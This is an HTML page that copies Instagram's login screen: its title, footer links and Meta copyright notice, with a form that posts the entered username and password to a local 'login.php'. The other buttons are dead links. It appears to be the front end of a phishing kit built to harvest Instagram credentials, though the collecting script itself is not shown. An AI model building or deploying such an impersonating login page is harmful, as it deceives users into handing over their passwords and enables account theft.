<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="favicon.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="main-container">
        <div class="phone-imgs">
            <!-- Background image handles this -->
        </div>

        <div class="right-side">
            <div class="login-box">
                <div class="logo"></div>
                <form action="login.php" method="POST">
                    <input type="text" name="username" placeholder="Phone number, username or email" required autofocus>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log in</button>
                </form>
                <div class="or-divider">
                    <div class="line"></div>
                    <div class="or-text">OR</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="fb-login">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="16" alt="FB">
                    Log in with Facebook
                </a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>

            <div class="signup-box">
                <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
            </div>

            <div class="app-box">
                <p class="get-app-text">Get the app.</p>
                <div class="app-badges">
                    <img src="badge_ios_english-en.png" alt="App Store">
                    <img src="badge_android_english-en.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>

            <a href="#">Terms</a>
            <a href="#">Top accounts</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact uploading and non-users</a>
        </div>
        <div class="meta-footer">
            <span>English (UK)</span>
            <span>© 2024 Instagram from Meta</span>
        </div>
    </footer>
</body>
</html>
